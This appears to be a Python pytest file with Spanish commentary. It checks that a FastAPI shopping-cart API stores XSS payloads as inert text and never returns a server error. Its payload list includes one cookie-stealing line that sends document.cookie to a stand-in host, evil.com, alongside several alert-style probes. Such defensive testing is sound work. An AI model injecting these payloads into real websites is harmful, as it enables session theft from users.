"""
Tests avanzados de XSS (Cross-Site Scripting) para la API del carrito.

OWASP API1/API8 — XSS en APIs REST
-------------------------------------
XSS en una API REST funciona diferente al XSS clasico en aplicaciones web:

XSS CLASICO (HTML): el servidor inserta el payload directamente en HTML que
el navegador renderiza. <script>alert(1)</script> se ejecuta porque el
navegador lo interpreta como HTML.

XSS EN API REST (Stored/Reflected en JSON):
1. El atacante guarda un payload XSS como datos (ej: nombre del producto).
2. El frontend Angular lee el JSON y renderiza el nombre.
3. Si Angular no escapa el HTML, el script se ejecuta en el navegador de
   otro usuario que ve ese producto.

Por que Angular protege automaticamente contra XSS
---------------------------------------------------
Angular tiene "DomSanitizer" integrado: cuando renderiza un valor en la
plantilla HTML con interpolacion {{ variable }}, escapa los caracteres HTML
especiales (<, >, &, ", '). Esto convierte:
    <script>alert(1)</script>
en:
    &lt;script&gt;alert(1)&lt;/script&gt;

Que el navegador muestra como texto, no como HTML ejecutable.

La proteccion de Angular NO es responsabilidad de la API:
La API REST retorna JSON; no renderiza HTML. Pero SI debe:
1. No ejecutar el script en el servidor (verificado aqui).
2. Almacenar y retornar el string identico (para que el frontend lo reciba
   y lo escape correctamente al renderizar).
"""

import pytest
from fastapi.testclient import TestClient

from src.carrito.api import app

client = TestClient(app)

PAYLOADS_XSS = [
    "<script>document.cookie='stolen'</script>",
    "<img src=x onerror=alert(1)>",
    "javascript:alert(1)",
    "<svg onload=alert(1)>",
    "<img src='x' onerror='fetch(\"http://evil.com/steal?c=\"+document.cookie)'>",
    "<body onload=alert('xss')>",
    "';alert(String.fromCharCode(88,83,83))//",
    "<iframe src='javascript:alert(1)'></iframe>",
    "<<SCRIPT>alert('xss');//<</SCRIPT>",
    "<div style='background:url(javascript:alert(1))'>",
    '"><script>alert(document.domain)</script>',
]


class TestXSSReflejado:
    """
    OWASP A7 (XSS): Verifica que los payloads XSS no se ejecutan en el servidor.

    Un status 500 seria critico: significaria que el servidor proceso el payload
    de alguna forma que no esperaba (aunque no lo ejecuto como JS).
    Un status 201 o 422 confirma que el servidor manejo el payload como dato.
    """

    @pytest.mark.parametrize("payload_xss", PAYLOADS_XSS)
    def test_payload_xss_no_causa_error_servidor(self, payload_xss: str):
        """
        Los payloads XSS en el nombre del producto no deben causar error 500.
        El servidor debe aceptarlos (201) o rechazarlos por validacion (422),
        pero nunca explotar con un error no manejado.
        """
        response = client.post(
            "/carrito/test-xss-avanzado/productos",
            json={"nombre": payload_xss, "precio": 100, "cantidad": 1},
        )
        assert response.status_code != 500, (
            f"El payload XSS '{payload_xss[:50]}...' causo error 500 en el servidor. "
            "Esto puede revelar informacion interna a un atacante."
        )
        assert response.status_code in (201, 422)

    @pytest.mark.parametrize("payload_xss", PAYLOADS_XSS)
    def test_payload_xss_se_almacena_como_texto_y_no_se_ejecuta(self, payload_xss: str):
        """
        Cuando un payload XSS se guarda en la BD y se recupera, debe retornarse
        IDENTICO al que fue enviado: el servidor no debe modificarlo ni ejecutarlo.

        Si el string retornado es diferente al enviado (por ejemplo, mas corto,
        o sin las etiquetas <script>), podria indicar que el servidor interpreta
        parcialmente el HTML. Aunque la API REST no renderiza HTML directamente,
        esta es una buena practica para confirmar el comportamiento del almacenamiento.
        """
        sesion = f"test-xss-{abs(hash(payload_xss)) % 10_000}"

        response_post = client.post(
            f"/carrito/{sesion}/productos",
            json={"nombre": payload_xss, "precio": 100, "cantidad": 1},
        )

        if response_post.status_code == 201:
            response_get = client.get(f"/carrito/{sesion}")
            assert response_get.status_code == 200

            productos = response_get.json()["productos"]
            nombres = [p["nombre"] for p in productos]

            assert payload_xss in nombres, (
                f"El payload XSS '{payload_xss[:50]}' fue modificado al almacenarse. "
                f"Nombres encontrados: {nombres}. "
                "El servidor debe almacenar el string exacto como fue enviado."
            )


class TestXSSEnCamposDeDescuento:
    """
    Verifica que los payloads XSS en el campo 'tipo' del descuento se manejan
    correctamente (la API debe retornar 422, no 500, para tipos invalidos).
    """

    def test_tipo_descuento_con_payload_xss_retorna_422(self):
        """
        El campo 'tipo' solo acepta 'porcentaje' o 'fijo'. Un payload XSS
        debe ser rechazado con 422 (validacion de negocio), no 500.
        """
        response = client.post(
            "/carrito/test-xss-tipo/descuento",
            json={"tipo": "<script>alert(1)</script>", "valor": 10},
        )
        assert response.status_code == 422, (
            "Un tipo de descuento invalido debe retornar 422, no otro codigo"
        )
        assert response.status_code != 500


class TestXSSEnCabeceras:
    """
    Verifica que las cabeceras de respuesta no reflejan payloads XSS.
    Algunos frameworks mal configurados reflejan el valor de cabeceras de
    request en la respuesta, lo que puede causar XSS via cabeceras.
    """

    def test_payload_xss_en_cabecera_accept_no_causa_500(self):
        """
        Un payload XSS en la cabecera Accept no debe causar error 500.
        """
        response = client.get(
            "/carrito/test-headers-xss",
            headers={"Accept": "<script>alert(1)</script>"},
        )
        assert response.status_code != 500
